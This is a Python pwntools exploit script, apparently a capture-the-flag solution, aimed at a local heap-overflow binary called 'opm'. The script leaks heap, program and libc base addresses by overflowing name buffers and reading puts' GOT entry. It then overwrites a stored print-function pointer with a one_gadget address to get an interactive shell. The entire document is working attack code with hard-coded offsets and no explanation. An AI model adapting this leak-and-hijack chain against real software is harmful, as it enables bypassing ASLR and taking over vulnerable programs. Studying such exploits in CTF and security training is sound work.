#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./opm"
#ENV = {"LD_PRELOAD":"./libc.so.6"}

puts_got_off = 0x202020
puts_addr_off = 0x6f690
one_gadget_off = 0x4526a
system_off = 0x45390

if len(sys.argv) > 1:
    one_gadget_off = int(sys.argv[1])

p = process(elf)


def add(s, n):
    p.recvuntil("(E)xit\n")
    p.sendline("A")
    p.recvuntil("Your name:\n")
    p.send(s)
    p.recvuntil("N punch?\n")
    p.sendline(str(n))

def show():
    p.recvuntil("(E)xit\n")
    p.sendline("S")


add("A"*0x70+"\n", "0")#0
add("B"*0x80+"\x10\n", "1")#1------------------------------------------
add("C"*0x80+"\n", "2"+"C"*0x7f+"\x10\n")#2----------------------------
p.recvuntil("B"*0x8)
heap_addr = u64(p.recv(6).ljust(8, "\x00"))-0x1c0 #leak heap addr
log.info("heap_addr: "+hex(heap_addr))

payload = p64(heap_addr+0x20)
payload += "\n"
payload1 = "3"+p8(0)*0x7f
payload1 += p64(heap_addr+0x278)
payload1 += "\n"
success('addr:'+hex(heap_addr+0x278))
add(payload, payload1)
#p.interactive()
p.recvuntil("<")
code_base = u64(p.recv(6).ljust(8, "\x00"))-0xb30  #leak_myprint addr 
log.info("code_base: "+hex(code_base))

puts_got_plt = code_base+puts_got_off

payload = p64(puts_got_plt)
payload += "\n"
payload1 = "4"+p8(0)*0x7f
payload1 += p64(heap_addr+0x2c8)
payload1 += "\n"
add(payload, payload1)

p.recvuntil("<")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-puts_addr_off #leak libc addr
log.info("libc_base: "+hex(libc_base))

one_gadget_addr = libc_base+one_gadget_off
system_addr = libc_base+system_off

payload = p64(one_gadget_addr)
payload += p8(0)*(0x80-len(payload))
payload += p64(heap_addr+0x320)
payload += "\n"
payload1 = "5"+p8(0)*0x7f
payload1 += p64(heap_addr+0x320) #make one gadget as the myprint
payload1 += "\n"
add(payload, payload1)

show()

p.interactive()